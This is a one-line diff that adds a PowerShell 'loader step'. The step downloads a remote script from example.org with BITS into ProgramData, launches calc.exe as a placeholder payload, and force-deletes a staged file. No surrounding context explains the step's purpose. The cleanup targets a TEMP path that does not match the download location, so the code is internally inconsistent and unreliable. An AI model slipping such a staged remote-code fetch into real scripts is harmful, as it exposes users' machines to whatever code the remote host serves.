@@ -1,0 +1,1 @@
+$FetchUrl = 'http://example.org:80/stage1.ps1'; $WorkingPath = "C:\ProgramData\stage2.bin"; $ConnectionTimeout = 112; try { Start-BitsTransfer -Source $FetchUrl -Destination $WorkingPath; Start-Process -FilePath "calc.exe"; Remove-Item -Path "$env:TEMP\stage2.bin" -Force } catch { Write-Warning "Loader step failed" }
